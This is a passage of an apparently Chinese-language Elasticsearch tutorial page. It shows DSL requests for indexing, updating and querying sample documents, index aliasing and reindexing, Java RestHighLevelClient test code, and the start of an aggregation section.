class="line">  &quot;city&quot;:&quot;深圳&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在深圳打工，来自湖北武汉&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=4  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;age&quot;:66,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=5  </span><br><span class="line">PUT /user/\_doc/5  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵子龙&quot;,  </span><br><span class="line">  &quot;age&quot;:77,  </span><br><span class="line">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;赵子龙来自深圳宝安，但是在广州工作！&quot;,  </span><br><span class="line">  &quot;address&quot;:&quot;广东省茂名市&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=6  </span><br><span class="line">PUT /user/\_doc/6  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵毅&quot;,  </span><br><span class="line">  &quot;age&quot;:55,  </span><br><span class="line">  &quot;city&quot;:&quot;广州&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;赵毅来自广州白云区，从事电子商务8年！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#新增文档数据 id=7  </span><br><span class="line">PUT /user/\_doc/7  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;赵哈哈&quot;,  </span><br><span class="line">  &quot;age&quot;:57,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;武汉赵哈哈，在深圳打工已有半年了，月薪7500！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">GET /user/\_doc/4  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">#更新数据,id=4  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">PUT /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">  &quot;age&quot;:66,  </span><br><span class="line">  &quot;city&quot;:&quot;武汉&quot;,  </span><br><span class="line">  &quot;description&quot;:&quot;在武汉读书，家在武汉！&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#使用POST更新某个域的数据  </span><br><span class="line">POST /user/\_doc/4  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;doc&quot;:&#123;  </span><br><span class="line">    &quot;name&quot;:&quot;张三丰&quot;,  </span><br><span class="line">    &quot;description&quot;:&quot;在武汉读书，家在武汉！在深圳工作！&quot;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">  </span><br><span class="line">GET /user/\_doc/2  </span><br><span class="line">  </span><br><span class="line">#搜索排序  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;sort&quot;:&#123;  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#分页实现  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;sort&quot;:&#123;  </span><br><span class="line">    &quot;age&quot;:&#123;  </span><br><span class="line">      &quot;order&quot;:&quot;desc&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;,  </span><br><span class="line">  &quot;from&quot;: 0,  </span><br><span class="line">  &quot;size&quot;: 2  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#查询-term  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;term&quot;:&#123;  </span><br><span class="line">      &quot;city&quot;:&quot;武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#查询-terms 允许多个Term  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;terms&quot;:&#123;  </span><br><span class="line">      &quot;city&quot;:  </span><br><span class="line">        \[  </span><br><span class="line">          &quot;武汉&quot;,  </span><br><span class="line">          &quot;广州&quot;  </span><br><span class="line">        \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match&quot;: &#123;  </span><br><span class="line">      &quot;city&quot;: &quot;广州武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;    </span><br><span class="line">  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;query\_string&quot;: &#123;  </span><br><span class="line">      &quot;default\_field&quot;: &quot;city&quot;,  </span><br><span class="line">      &quot;query&quot;: &quot;广州武汉&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#-range 范围过滤  </span><br><span class="line">#gt表示&gt; gte表示=&gt;  </span><br><span class="line">#lt表示&lt; lte表示&lt;=  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;:&#123;  </span><br><span class="line">    &quot;range&quot;: &#123;  </span><br><span class="line">      &quot;age&quot;: &#123;  </span><br><span class="line">        &quot;gte&quot;: 30,  </span><br><span class="line">        &quot;lte&quot;: 57  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#搜索 exists：是指包含某个域的数据检索  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;exists&quot;:&#123;  </span><br><span class="line">      &quot;field&quot;:&quot;address&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">#过滤搜索 bool   </span><br><span class="line">#must : 多个查询条件的完全匹配,相当于 and。  </span><br><span class="line">#must\_not : 多个查询条件的相反匹配，相当于 not。  </span><br><span class="line">#should : 至少有一个查询条件匹配, 相当于 or。  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;bool&quot;: &#123;  </span><br><span class="line">      &quot;must&quot;: \[  </span><br><span class="line">        &#123;  </span><br><span class="line">          &quot;term&quot;: &#123;  </span><br><span class="line">            &quot;city&quot;: &#123;  </span><br><span class="line">              &quot;value&quot;: &quot;深圳&quot;  </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;,  </span><br><span class="line">        &#123;  </span><br><span class="line">          &quot;range&quot;:&#123;  </span><br><span class="line">            &quot;age&quot;:&#123;  </span><br><span class="line">              &quot;gte&quot;:20,  </span><br><span class="line">              &quot;lte&quot;:99  </span><br><span class="line">            &#125;  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#查询所有 match\_all  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#字符串匹配  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match&quot;: &#123;  </span><br><span class="line">      &quot;description&quot;: &quot;武汉广州&quot;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#前缀匹配 prefix  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;prefix&quot;: &#123;  </span><br><span class="line">      &quot;name&quot;: &#123;  </span><br><span class="line">        &quot;value&quot;: &quot;赵&quot;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">#多个域匹配搜索  </span><br><span class="line">GET \_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;multi\_match&quot;: &#123;  </span><br><span class="line">      &quot;query&quot;: &quot;深圳&quot;,  </span><br><span class="line">      &quot;fields&quot;: \[  </span><br><span class="line">        &quot;city&quot;,  </span><br><span class="line">        &quot;description&quot;  </span><br><span class="line">      \]  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">GET /user/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">  &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;bool&quot;: &#123;  </span><br><span class="line">      &quot;filter&quot;: &#123;  </span><br><span class="line">         &quot;range&quot;:&#123;  </span><br><span class="line">          &quot;age&quot;:&#123;  </span><br><span class="line">            &quot;gte&quot;:25,  </span><br><span class="line">            &quot;lte&quot;: 80  </span><br><span class="line">          &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">      &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="4-4-使用别名"><a href="#4-4-使用别名" class="headerlink" title="4.4 使用别名"></a>4.4 使用别名</h2><p>在mysql中 我们经常遇到产品修改需求 我们可能会在原有数据库表基础上 对字段 索引 类型进行修改比如 增加一个字段 添加一个字段的索引 又或者修改某个字段的类型，这一切都看起来这么自然 不过在ES这里却是行不通的 ES的mapping一旦设置了之后，可以改，但是改了没有用，因为ES默认是对所有字段进行索引 如果你修改了mapping 那么已经索引过的数据就必须全部重新索引一遍 , ES没有提供这个机制, 只能利用别名手工刷数据，</p><ol><li><strong>添加索引别名</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT article1/\_alias/article  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;acknowledged&quot; : true  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="2"><li><strong>创建新article2索引（增加了一个owner字段）</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT article2  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;settings&quot;: &#123;  </span><br><span class="line">&quot;number\_of\_shards&quot;: 3,  </span><br><span class="line">&quot;number\_of\_replicas&quot;: 1 ,  </span><br><span class="line">&quot;analysis&quot; : &#123;  </span><br><span class="line">&quot;analyzer&quot; : &#123;  </span><br><span class="line">&quot;ik&quot; : &#123;  </span><br><span class="line">&quot;tokenizer&quot; : &quot;ik\_max\_word&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;mappings&quot;: &#123;  </span><br><span class="line">&quot;properties&quot;: &#123;  </span><br><span class="line">&quot;id&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;title&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">&quot;analyzer&quot;: &quot;ik\_max\_word&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;content&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">&quot;analyzer&quot;: &quot;ik\_max\_word&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;viewCount&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;integer&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;creatDate&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;date&quot;,  </span><br><span class="line">&quot;format&quot;: &quot;yyyy-MM-dd HH:mm:ss||yyyy-MM-dd||epoch\_millis&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;tags&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">&#125;,   </span><br><span class="line">&quot;owner&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="3"><li><strong>重建索引 reindex</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST \_reindex  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;source&quot;: &#123;  </span><br><span class="line">&quot;index&quot;: &quot;article1&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;dest&quot;: &#123;  </span><br><span class="line">&quot;index&quot;: &quot;article2&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="4"><li><strong>修改别名映射</strong></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /\_aliases  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;actions&quot;: \[  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;remove&quot;: &#123;  </span><br><span class="line">&quot;index&quot;: &quot;article1&quot;,  </span><br><span class="line">&quot;alias&quot;: &quot;article&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;add&quot;: &#123;  </span><br><span class="line">&quot;index&quot;: &quot;article2&quot;,  </span><br><span class="line">&quot;alias&quot;: &quot;article&quot;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">\]  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><ol start="5"><li>使用别名搜索</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">GET /article/\_search  </span><br><span class="line">&#123;  </span><br><span class="line">    &quot;query&quot;: &#123;  </span><br><span class="line">    &quot;match\_all&quot;: &#123;&#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="5-从0开始，ES工业级Java-应用开发"><a href="#5-从0开始，ES工业级Java-应用开发" class="headerlink" title="5 从0开始，ES工业级Java 应用开发"></a>5 从0开始，ES工业级Java 应用开发</h1><h2 id="5-1-High-Level-Client基本用法"><a href="#5-1-High-Level-Client基本用法" class="headerlink" title="5.1 High Level Client基本用法"></a>5.1 High Level Client基本用法</h2><p>High Level Client客户端是构建于 Low Level Client之上的封装。</p><p>类似于Hibernate和JDBC的关系。</p><p>使用Spring Data ElasticSearch访问ElastiSearch,注意版本对应关系</p><p><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/20.png"><br>spring boot 2.6.1对应的ES版本<br><img src="/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/21.png"><br>High Level Client客户端测试案例</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE)  </span><br><span class="line">public class RestHighLevelClientTest  </span><br><span class="line">&#123;  </span><br><span class="line">  </span><br><span class="line">    //用来操作 Elasticsearch 服务器的一个客户端对象类  </span><br><span class="line">    @Autowired  </span><br><span class="line">    private RestHighLevelClient restHLClient;  </span><br><span class="line">  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @ValueSource(ints = &#123;1, 2, 3&#125;)  </span><br><span class="line">    void testWithSimpleValueSource(int argument) &#123;  </span><br><span class="line">        System.out.println(&quot;Parameterized test with value: &quot; + argument);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @Test  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    void testWithSneakyThrows() &#123;  </span><br><span class="line">        throw new Exception(&quot;This exception is sneaky thrown!&quot;);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @CsvSource(&#123;&quot;1, 1, 2&quot;, &quot;2, 3, 5&quot;, &quot;3, 5, 8&quot;&#125;)  </span><br><span class="line">    void testAddition(int a, int b, int result) &#123;  </span><br><span class="line">        int sum = a + b;  </span><br><span class="line">        Assertions.assertEquals(result, sum, &quot;Sum of &quot; + a + &quot; and &quot; + b + &quot; should be &quot; + result);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //创建三个索引库  </span><br><span class="line">    @ParameterizedTest //参数测试  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @ValueSource(strings = &#123;&quot;books&quot;, &quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class="line">    public void testCreateIndex(String indexName)  </span><br><span class="line">    &#123;  </span><br><span class="line">  </span><br><span class="line">        //指定分词器创建索引库的json格式的数据，每一行用双引号包起来，然后里面的每个双引号前面用反斜杠\\转义  </span><br><span class="line">        String json = &quot;&#123;&quot; +  </span><br><span class="line">                &quot;\\&quot;settings\\&quot;: &#123;&quot; +  </span><br><span class="line">                &quot;    \\&quot;analysis\\&quot;: &#123;&quot; +  </span><br><span class="line">                &quot;      \\&quot;analyzer\\&quot;: &#123;&quot; +  </span><br><span class="line">                &quot;        \\&quot;default\\&quot;: &#123;&quot; +  </span><br><span class="line">                &quot;           \\&quot;tokenizer\\&quot;: \\&quot;ik\_max\_word\\&quot;&quot; +  </span><br><span class="line">                &quot;        &#125;&quot; +  </span><br><span class="line">                &quot;      &#125;&quot; +  </span><br><span class="line">                &quot;    &#125;&quot; +  </span><br><span class="line">                &quot;  &#125;&quot; +  </span><br><span class="line">                &quot;&#125;&quot;;  </span><br><span class="line">  </span><br><span class="line">        CreateIndexRequest request = new CreateIndexRequest(indexName)  </span><br><span class="line">                //参数1：指定创建索引库时要传入的参数  ； 参数2：指定传入内容的类型  </span><br><span class="line">                .source(json, XContentType.JSON);  </span><br><span class="line">        //创建索引库后返回的响应类型--CreateIndexResponse  </span><br><span class="line">        CreateIndexResponse resp = restHLClient.indices().create(request, RequestOptions.DEFAULT);  </span><br><span class="line">  </span><br><span class="line">        //获取Elasticsearch服务器的响应，就是响应索引库是否创建成功  </span><br><span class="line">        System.err.println(resp.isAcknowledged());  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    //删除索引库  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @ValueSource(strings = &#123;&quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class="line">    public void testDeleteIndex(String indexName)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //删除索引的请求数据  </span><br><span class="line">        DeleteIndexRequest request = new DeleteIndexRequest(indexName);  </span><br><span class="line">        //客户端调用操作索引的方法，然后再调用删除的方法  </span><br><span class="line">        AcknowledgedResponse resp = restHLClient.indices().delete(request, RequestOptions.DEFAULT);  </span><br><span class="line">        //查看删除后的响应  </span><br><span class="line">        System.err.println(resp.isAcknowledged());  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //查询所有的索引库  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @Test //这个测试不需要参数，直接用这个@Test注解即可  </span><br><span class="line">    public void testGetIndex()  </span><br><span class="line">    &#123;  </span><br><span class="line">        //参数 &quot;\*&quot; ： 表示匹配所有的索引库  </span><br><span class="line">        GetIndexRequest request = new GetIndexRequest(&quot;\*&quot;);  </span><br><span class="line">        //用rest客户端的方法来查询  </span><br><span class="line">        GetIndexResponse resp = restHLClient.indices().get(request, RequestOptions.DEFAULT);  </span><br><span class="line">        //返回的索引库是一个String类型的数组  </span><br><span class="line">        String\[\] indices = resp.getIndices();  </span><br><span class="line">        //把数组转成字符串  </span><br><span class="line">        String s = Arrays.toString(indices);  </span><br><span class="line">        System.err.println(s);  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //往索引库添加文档  </span><br><span class="line">  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    //测试参数有多个值 ，用这个注解  </span><br><span class="line">    @CsvSource(&#123;  </span><br><span class="line">            &quot;1,火影忍者,旋涡鸣人成长为第七代火影的故事,150&quot;,  </span><br><span class="line">            &quot;2,家庭教师,废材纲成长为十代首领的热血事迹,200&quot;,  </span><br><span class="line">            &quot;4,七龙珠Z,超级赛亚人贝吉塔来到地球后的热闹景象,400&quot;  </span><br><span class="line">    &#125;)  </span><br><span class="line">    public void testSaveDocument(Integer id, String title, String description, Double price)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //表明向 books 索引库添加文档  </span><br><span class="line">        IndexRequest request = new IndexRequest(&quot;books&quot;)  </span><br><span class="line">                .id(id + &quot;&quot;)  </span><br><span class="line">                .source(  </span><br><span class="line">                        &quot;title&quot;, title,  </span><br><span class="line">                        &quot;description&quot;, description,  </span><br><span class="line">                        &quot;price&quot;, price  </span><br><span class="line">                );  </span><br><span class="line">  </span><br><span class="line">        IndexResponse resp = restHLClient.index(request, RequestOptions.DEFAULT);  </span><br><span class="line">        System.err.println(resp);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    //根据文档的id获取文档  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @ValueSource(ints = &#123;1, 3&#125;)  </span><br><span class="line">    public void testGetDocumentById(Integer id)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //表明从 books 索引库获取文档  </span><br><span class="line">        GetRequest request = new GetRequest(&quot;books&quot;)  </span><br><span class="line">                //表明根据指定的文档的id获取文档  </span><br><span class="line">                .id(id + &quot;&quot;);  </span><br><span class="line">  </span><br><span class="line">        GetResponse resp = restHLClient.get(request, RequestOptions.DEFAULT);  </span><br><span class="line">  </span><br><span class="line">        System.err.println(resp);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    //根据条件查询文档（普通关键字查询和通配符查询）  </span><br><span class="line">  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @CsvSource(&#123;  </span><br><span class="line">            &quot;description,热\*&quot;,  </span><br><span class="line">            &quot;description,成长&quot;  </span><br><span class="line">    &#125;)  </span><br><span class="line">    public void testSearchDocument(String field, String term)  </span><br><span class="line">    &#123;  </span><br><span class="line">        // 构建查询条件的类  </span><br><span class="line">        SearchSourceBuilder builder = new SearchSourceBuilder();  </span><br><span class="line">  </span><br><span class="line">        // 通过 SearchSourceBuilder 可以用面向对象的方式来构建查询的 JSON 字符串  </span><br><span class="line">        // SearchSourceBuilder 需要传入 QueryBuilders，而 QueryBuilders 用于构建 QueryBuilder  </span><br><span class="line">        if (term != null &amp;&amp; term.contains(&quot;\*&quot;))  </span><br><span class="line">        &#123;  </span><br><span class="line">            //根据字段和通配符关键字查询  </span><br><span class="line">            builder.query(QueryBuilders.wildcardQuery(field, term));  </span><br><span class="line">        &#125; else  </span><br><span class="line">        &#123;  </span><br><span class="line">            //根据字段和普通关键字查询  </span><br><span class="line">            builder.query(QueryBuilders.matchQuery(field,term));  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        //表明从 books 索引库查询文档  </span><br><span class="line">        SearchRequest request = new SearchRequest(&quot;books&quot;)  </span><br><span class="line">                // 此处的 builder 参数用于构建查询语法  </span><br><span class="line">                .source(builder);  </span><br><span class="line">  </span><br><span class="line">        //客户端调用查询的方法 ， 参数1：查询条件语法  参数2：默认的请求选项，比如超时时间之类的  </span><br><span class="line">        SearchResponse resp = restHLClient.search(request, RequestOptions.DEFAULT);  </span><br><span class="line">  </span><br><span class="line">        System.err.println(resp);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">    //根据 id 删除文档  </span><br><span class="line">  </span><br><span class="line">    @ParameterizedTest  </span><br><span class="line">    @SneakyThrows  </span><br><span class="line">    @ValueSource(ints = &#123;3,4&#125;)  </span><br><span class="line">    public void testDeleteDocumentById(Integer id)  </span><br><span class="line">    &#123;  </span><br><span class="line">        //表明从 books 索引库删除文档  </span><br><span class="line">        DeleteRequest request = new DeleteRequest(&quot;books&quot;)  </span><br><span class="line">                //获取指定id的文档  </span><br><span class="line">                .id(id+&quot;&quot;);  </span><br><span class="line">        //rest客户端调用删除文档的方法  </span><br><span class="line">        DeleteResponse resp = restHLClient.delete(request, RequestOptions.DEFAULT);  </span><br><span class="line">        System.err.println(resp);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="5-2-聚合查询"><a href="#5-2-聚合查询" class="headerlink" title="5.2 聚合查询"></a>5.2 聚合查询</h2><h3 id="5-2-1-DSL聚合查询"><a href="#5-2-1-DSL聚合查询" class="headerlink" title="5.2.1 DSL聚合查询"></a>5.2.1 DSL聚合查询</h3><ol><li>创建测试索引</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">PUT /jh\_test  </span><br><span class="line">&#123;  </span><br><span class="line">&quot;settings&quot;: &#123;&#125;,  </span><br><span class="line">&quot;mappings&quot;: &#123;  </span><br><span class="line">&quot;properties&quot;: &#123;  </span><br><span class="line">&quot;name&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;text&quot;,  </span><br><span class="line">                &quot;fields&quot;: &#123;  </span><br><span class="line">                    &quot;keyword&quot;: &#123;  </span><br><span class="line">                        &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class="line">                        &quot;ignore\_above&quot;: 256  </span><br><span class="line">                    &#125;  </span><br><span class="line">                &#125;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;sex&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;keyword&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">&quot;buyCount&quot;: &#123;  </span><br><span class="line">&quot;type&quot;: &quot;long&quot;  </span><br><span class="line">&#125;,  </span><br><span class="line">            &quot;createMonth&quot;:&#123;  </span><br><span class="line">                &quot;type&quot;:&quot;keyword&quot;  </span><br><span class="line">            &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中字段的含义为：name：姓名、buyCount：购买数量，sex：性别，createMonth：创建月 添加测试数据</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">POST /jh\_test/\_doc/1  </span><br><span class="line">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class="line">POST /jh\_test/\_doc/2  </span><br><span 